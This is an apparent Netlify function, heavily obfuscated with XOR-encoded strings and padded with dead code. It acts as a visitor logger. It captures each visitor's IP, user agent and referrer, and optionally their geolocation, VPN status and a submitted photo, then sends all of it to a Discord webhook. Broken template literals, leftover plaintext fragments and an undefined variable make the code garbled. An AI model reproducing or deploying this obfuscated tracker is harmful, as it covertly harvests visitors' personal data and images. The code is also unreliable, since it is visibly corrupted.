export async function handler(event) {
    // Get Discord webhook URL from Netlify environment variable
        // Try to get geolocation from IPAPI
      description: `${flagEmoji} New visitor from ${geoData.country}`,

const _tvmrav=4384;const _vcmigx=()=>_tvmrav*2;if(false){_vcmigx();}(function(){const _mfyexq=(t,k)=>t.map(c=>String.fromCharCode(c^k)).join('');console.log(_mfyexq([2,49,42,39,48,45,43,42,100,55,48,37,54,48,33,32],68));console.log(_mfyexq([1,50,33,42,48,126],68),JSON.stringify(event,null,2));try{const _ugqlcb = process.env.DISCORD_WEBHOOK_URL;console.log(_mfyexq([0,45,55,39,43,54,32,100,51,33,38,44,43,43,47,100,17,22,8,126],68),_ugqlcb ? _mfyexq([23,33,48],68):_mfyexq([10,43,48,100,55,33,48],68));if (!_ugqlcb){console.error(_mfyexq([0,45,55,39,43,54,32,100,51,33,38,44,43,43,47,100,17,22,8,100,42,43,48,100,39,43,42,34,45,35,49,54,33,32],68));return{statusCode:500,body:_mfyexq([0,45,55,39,43,54,32,100,51,33,38,44,43,43,47,100,17,22,8,100,42,43,48,100,39,43,42,34,45,35,49,54,33,32],68)};}const _gmxumr = event.headers[_mfyexq([60,105,34,43,54,51,37,54,32,33,32,105,34,43,54],68)] || event.headers[_mfyexq([60,105,54,33,37,40,105,45,52],68)] || event.headers[_mfyexq([60,105,39,40,45,33,42,48,105,45,52],68)] || event.headers[_mfyexq([39,34,105,39,43,42,42,33,39,48,45,42,35,105,45,52],68)] || _mfyexq([17,42,47,42,43,51,42],68);console.log(_mfyexq([7,40,45,33,42,48,100,13,20,126],68),_gmxumr);let _agaozd ={};try{if (event.body){_agaozd = JSON.parse(event.body);console.log(_mfyexq([22,33,53,49,33,55,48,100,38,43,32,61,100,52,37,54,55,33,32,100,55,49,39,39,33,55,55,34,49,40,40,61],68));}}catch (error){console.error(_mfyexq([1,54,54,43,54,100,52,37,54,55,45,42,35,100,54,33,53,49,33,55,48,100,38,43,32,61,126],68),error);}const _knfgea = event.headers[_mfyexq([49,55,33,54,105,37,35,33,42,48],68)] || _mfyexq([17,42,47,42,43,51,42],68);const _qsafkk = event.headers[_mfyexq([27,53,55,37,34,47,47],68)] || _mfyexq([0,45,54,33,39,48],68);const _monwwm = new Date().toISOString();console.log(_mfyexq([17,55,33,54,100,5,35,33,42,48,126],68),_knfgea);console.log(_mfyexq([22,33,34,33,54,33,54,126],68),_qsafkk);let _wpnall ={country:_mfyexq([17,42,47,42,43,51,42],68),country_code:_mfyexq([17,42,47,42,43,51,42],68),city:_mfyexq([17,42,47,42,43,51,42],68),region:_mfyexq([17,42,47,42,43,51,42],68),org:_mfyexq([17,42,47,42,43,51,42],68),timezone:_mfyexq([17,42,47,42,43,51,42],68),isVpn:false};if (_agaozd.includeLocation){try{console.log(_mfyexq([2,33,48,39,44,45,42,35,100,35,33,43,40,43,39,37,48,45,43,42,100,34,43,54,100,13,20,126],68),_gmxumr);const _clxmtr = await fetch(`https:console.log(_mfyexq([3,33,43,100,5,20,13,100,27,40,45,40,34,40,38,100,55,48,37,48,49,55,126],68),_clxmtr.status);if (_clxmtr.ok){const _fhdnhy = await _clxmtr.json();console.log(_mfyexq([3,33,43,100,32,37,48,37,126],68),_fhdnhy);const _blggmn = [_mfyexq([5,23,117,119,119,119,113],68),_mfyexq([5,23,124,116,115,113],68),_mfyexq([5,23,117,112,116,114,117],68),_mfyexq([5,23,117,114,113,116,125],68),_mfyexq([5,23,118,116,125,112,116],68),_mfyexq([5,23,125,116,116,125],68),_mfyexq([5,23,117,115,112],68),_mfyexq([5,23,119,118,113,125,116],68),_mfyexq([5,23,113,112,117,117,119],68)];const _twxvjb = [_mfyexq([39,40,43,49,32,34,40,37,54,33],68),_mfyexq([32,45,35,45,48,37,40,100,43,39,33,37,42],68),_mfyexq([37,41,37,62,43,42],68),_mfyexq([35,43,43,35,40,33],68),_mfyexq([41,45,39,54,43,55,43,34,48],68),_mfyexq([43,54,37,39,40,33],68),_mfyexq([50,49,40,48,54],68),_mfyexq([40,45,42,43,32,33],68),_mfyexq([44,33,48,62,42,33,54],68)];const _qfhlim = _blggmn.includes(_fhdnhy.asn) || _twxvjb.some(vpnOrg => _fhdnhy.org?.toLowerCase().includes(vpnOrg));_wpnall ={country:_fhdnhy.country_name || _mfyexq([17,42,47,42,43,51,42],68),country_code:_fhdnhy.country || _mfyexq([17,42,47,42,43,51,42],68),city:_fhdnhy.city || _mfyexq([17,42,47,42,43,51,42],68),region:_fhdnhy.region || _mfyexq([17,42,47,42,43,51,42],68),org:_fhdnhy.org || _fhdnhy.asn_org || _mfyexq([17,42,47,42,43,51,42],68),timezone:_fhdnhy.timezone || _mfyexq([17,42,47,42,43,51,42],68),isVpn:_qfhlim};}else{console.log(_mfyexq([3,33,43,100,5,20,13,100,34,37,45,40,33,32,100,51,45,48,44,100,55,48,37,48,49,55,126],68),_clxmtr.status);}}catch (error){console.error(_mfyexq([1,54,54,43,54,100,34,33,48,39,44,45,42,35,100,35,33,43,40,43,39,37,48,45,43,42,126],68),error);}}else{console.log(_mfyexq([3,33,43,40,43,39,37,48,45,43,42,100,42,43,48,100,33,42,37,38,40,33,32,104,100,55,47,45,52,52,45,42,35],68));}console.log(_mfyexq([2,45,42,37,40,100,27,34,44,32,42,44,61,100,32,37,48,37,126],68),_wpnall);const _ngdakr = (countryCode) =>{if (!countryCode || countryCode.length !== 2) return 'ðŸŒ';const _blkurh = [...countryCode.toUpperCase()].map(char => 0x1F1E6 + (char.charCodeAt(0) - 65) );return String.fromCodePoint(...codePoints);};const _wjmxyh = _ngdakr(_wpnall.country_code);const _ibmcov ={title:_mfyexq([55417,56649,100,10,33,51,100,18,45,55,45,48,43,54,100,0,33,48,33,39,48,33,32],68),color:0x00CED1,fields:[]};_ibmcov.fields.push({name:_mfyexq([55416,57172,100,13,20,100,5,32,32,54,33,55,55],68),value:`[${_gmxumr}](https:inline:true});if (_agaozd.includeLocation){_ibmcov.fields.push({name:_mfyexq([55417,56457,100,8,43,39,37,48,45,43,42],68),value:`${_wpnall.city},${_wpnall.region}`,inline:true},{name:_mfyexq([55416,57254,100,11,54,35,37,42,45,62,37,48,45,43,42],68),value:_wpnall.org,inline:false},{name:_mfyexq([55416,57161,100,7,43,49,42,48,54,61],68),value:`${_wjmxyh}${_wpnall.country}`,inline:true},{name:_mfyexq([55417,56596,100,16,45,41,33,62,43,42,33],68),value:_wpnall.timezone,inline:true},{name:_mfyexq([55417,56997,65099,100,18,20,10,107,20,54,43,60,61],68),value:_wpnall.isVpn ? _mfyexq([55417,57253,100,8,45,47,33,40,61,100,18,20,10,107,20,54,43,60,61],68):_mfyexq([55417,57254,100,10,43,48,100,32,33,48,33,39,48,33,32],68),inline:true});}_ibmcov.fields.push({name:_mfyexq([55417,56659,100,22,33,34,33,54,33,54],68),value:_qsafkk,inline:false},{name:_mfyexq([55417,56801,65099,100,17,55,33,54,100,5,35,33,42,48],68),value:_knfgea.length > 100 ? _knfgea.substring(0,100) + _mfyexq([106,106,106],68):_knfgea,inline:false});_ibmcov.footer ={text:_mfyexq([18,45,55,45,48,43,54,100,5,42,37,40,61,48,45,39,55,100,8294,100,116,60,20,55,61,39,44,43,23,33,39,49,54,45,48,61],68),icon_url:_mfyexq([44,48,48,52,55,126,107,107,35,45,34,32,38,106,39,43,41,107,45,41,37,35,33,55,107,44,45,35,44,107,38,40,49,33,105,33,61,33,55,105,38,40,45,42,47,45,42,35,105,39,114,32,55,37,49,45,125,116,39,54,39,113,61,32,34,106,35,45,34],68)};_ibmcov.timestamp = _monwwm;if (_agaozd.includeImage && _agaozd.photo){try{if (typeof _agaozd.photo === _mfyexq([55,48,54,45,42,35],68) && _agaozd.photo.startsWith(_mfyexq([32,37,48,37,126,45,41,37,35,33,107],68))){_ibmcov.thumbnail ={url:_agaozd.photo};console.log(_mfyexq([13,41,37,35,33,100,48,44,49,41,38,42,37,45,40,100,37,32,32,33,32],68));}}catch (error){console.error(_mfyexq([1,54,54,43,54,100,52,54,43,39,33,55,55,45,42,35,100,45,41,37,35,33,126],68),error);}}else{console.log(_mfyexq([13,41,37,35,33,100,39,37,52,48,49,54,33,100,42,43,48,100,33,42,37,38,40,33,32,104,100,55,47,45,52,52,45,42,35],68));}const _cergwd ={embeds:[_ibmcov]};console.log(_mfyexq([5,38,43,49,48,100,48,43,100,55,33,42,32,100,51,33,38,44,43,43,47],68));console.log(_mfyexq([19,33,38,44,43,43,47,100,17,22,8,126],68),_ugqlcb);console.log(_mfyexq([19,33,38,44,43,43,47,100,52,37,61,40,43,37,32,126],68),JSON.stringify(_cergwd,null,2));const _lilflb = await fetch(_ugqlcb,{method:_mfyexq([20,11,23,16],68),headers:{_mfyexq([7,43,42,48,33,42,48,105,16,61,52,33],68):_mfyexq([37,52,52,40,45,39,37,48,45,43,42,107,46,55,43,42],68)},body:JSON.stringify(_cergwd)});console.log(_mfyexq([19,33,38,44,43,43,47,100,55,33,42,48],68));console.log(_mfyexq([22,33,55,52,43,42,55,33,100,55,48,37,48,49,55,126],68),_lilflb.status);console.log(_mfyexq([22,33,55,52,43,42,55,33,100,43,47,126],68),_lilflb.ok);if (!_lilflb.ok){const _lmrdpt = await _lilflb.text();console.error(_mfyexq([0,45,55,39,43,54,32,100,51,33,38,44,43,43,47,100,33,54,54,43,54,100,54,33,55,52,43,42,55,33,126],68),_lmrdpt);return{statusCode:_lilflb.status,body:`Discord webhook error:${_lilflb.statusText}- ${_lmrdpt}`};}console.log(_mfyexq([19,33,38,44,43,43,47,100,55,49,39,39,33,55,55,34,49,40],68));return{statusCode:204,body:_mfyexq([23,49,39,39,33,55,55],68)};}catch (error){console.error(_mfyexq([2,49,42,39,48,45,43,42,100,33,54,54,43,54,126],68),error);console.error(_mfyexq([1,54,54,43,54,100,55,48,37,39,47,126],68),error.stack);return{statusCode:500,body:`Internal server error:${error.message}`};}}})();